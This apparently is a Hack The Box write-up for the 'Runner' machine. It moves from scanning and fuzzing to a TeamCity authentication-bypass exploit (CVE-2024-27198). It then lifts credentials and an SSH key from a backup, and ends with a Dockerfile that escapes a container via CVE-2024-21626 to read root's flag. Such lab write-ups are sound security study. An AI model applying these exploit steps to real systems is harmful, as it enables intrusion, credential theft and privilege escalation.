User FLAG
-----

1. Scan ports

PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http        nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/
211/tcp  filtered 914c-g
7921/tcp filtered unknown
8000/tcp open     nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).

2. Add runner.htb to /etc/hosts

## Searchsploit

```bash
searchsploit nagios nsca
Exploits: No Results
Shellcodes: No Results
```

## Feroxbuster

```bash
feroxbuster --insecure -o ferox -u http://runner.htb:8000 -m GET POST -w ~/Documents/Security/wordlists/common.txt
200      GET        1l        1w        3c http://runner.htb:8000/health
200     POST        1l        1w        3c http://runner.htb:8000/health
200      GET        1l        1w        9c http://runner.htb:8000/version
200     POST        1l        1w        9c http://runner.htb:8000/version
```

## Dirsearch

## Dig

```bash
user in ~/Documents/Proyectos/hack-the-box/machines/runner on main ● ● λ dig axfr runner.htb @10.129.244.212  
;; Connection to 10.129.244.212#53(10.129.244.212) for runner.htb failed: connection refused.
;; Connection to 10.129.244.212#53(10.129.244.212) for runner.htb failed: connection refused.
;; Connection to 10.129.244.212#53(10.129.244.212) for runner.htb failed: connection refused.

user in ~/Documents/Proyectos/hack-the-box/machines/runner on main ● ● λ dig @10.129.244.212 -x 10.129.244.212
;; communications error to 10.129.244.212#53: connection refused
;; communications error to 10.129.244.212#53: connection refused
;; communications error to 10.129.244.212#53: connection refused

; <<>> DiG 9.18.18-0ubuntu0.22.04.2-Ubuntu <<>> @10.129.244.212 -x 10.129.244.212
; (1 server found)
;; global options: +cmd
;; no servers could be reached
```

## Whatweb

```bash
http://runner.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sales@runner.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.244.212], JQuery[3.5.1], PoweredBy[TeamCity!], Script, Title[Runner - CI/CD Specialists], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

## Wfuzz

```bash
wfuzz -c --hh=154 --hw=10 -w ~/Documents/Security/wordlists/subdomains-top1million-110000.txt -H "Host:FUZZ.runner.htb" -u http://runner.htb
## Nothing found
teamcity.runner.htb
```

## Exploit

```
Version 2023.05.3 (build 129390)
```

3. `python CVE-2024-27198.py -t http://teamcity.runner.htb -u test -p test`

4. Download backgrup and found database credentials

```bash
admin $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye
matthew $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em:piper123
```

5. From the backup, we can see the SSH key of the user `john`
6. Login with the SSH key and get the user flag

Root FLAG
----

```
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                                                                                         
tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                                                                                         
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                                         
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                                         
tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                                                                                         
tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                                                                                         
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                                                                                         
tcp6       0      0 :::80                   :::*                    LISTEN      -                                                                                         
tcp6       0      0 :::22                   :::*                    LISTEN      -                                                                                         
tcp6       0      0 :::8000                 :::*                    LISTEN      - 
```

```bash
cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 runner runner.htb teamcity.runner.htb portainer-administration.runner.htb
## Login to portainer with matthew:piper123
```

1. Login to portainer with `matthew:piper123`

2. Create a new image with the following `Dockerfile`

```Dockerfile
FROM ubuntu:latest

WORKDIR /proc/self/fd/8

RUN cd ../../../../ && cat root/root.txt
```

Then we can see the root flag

## Links

- https://github.com/cdxiaodong/CVE-2024-21626/blob/main/docker-compose.yml
- https://medium.com/@sk3pper/play-with-cve-2024-21626-2b4377e9577f